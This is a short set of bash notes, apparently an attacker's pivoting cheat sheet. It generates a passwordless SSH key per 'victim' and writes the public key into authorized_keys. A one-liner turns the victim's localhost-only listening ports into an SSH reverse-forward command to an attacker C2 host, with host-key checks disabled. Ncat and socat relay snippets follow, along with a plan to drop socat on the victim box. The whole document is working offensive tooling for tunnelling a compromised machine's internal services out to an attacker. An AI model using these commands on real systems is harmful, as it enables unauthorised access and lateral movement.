```bash 
#generate per victim ssh key and allow it to connect 
#chroot of some form recommended.

# https://unix.stackexchange.com/questions/69314/automated-ssh-keygen-without-passphrase-how

ssh-keygen -b 2048 -t rsa -f /tmp/sshkey -q -N ""
sudo mv /tmp/sshkey.pub ~/.ssh/authorized_keys 
# mv /tmp/sshkey /var/www/html sshkey < if we want to script transferring to victim>
```

```bash
# one liner to output SSH command that forwards victim's ports to attacker via ssh if they're only listening on 127.0.0.1

netstat -antpu 2&>/dev/null |grep "127.0.0.1"| awk '{print $4}'|cut -d ":" -f2>listening_ports; sed 's/[[:digit:]]\+/-R 0:localhost:&/' listening_ports| tr '\n' ' '  > ssh_cmd ;sed  's/^.*$/ssh -o "StrictHostKeyChecking no" -o "UserKnownHostsFile \/dev\/null" -i \/tmp\/key &$C2/g' ssh_cmd > ssh_cmd.sh;cat ssh_cmd.sh

# sample output 
# ssh -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /# dev/null" -i /tmp/key -R 0:localhost:22 -R 0:localhost:500 # -R 0:localhost:4500 $C2%  

```

Todo: integrate below tools into above framework
achieving port forwarding with other tools
``` bash
#ncat 
ncat -l localhost 8080 --sh-exec "ncat example.org 80"

#socat etc, to be completed
# drop socat on victim box, then can use that

https://unix.stackexchange.com/questions/293304/using-netcat-for-port-forwarding
```
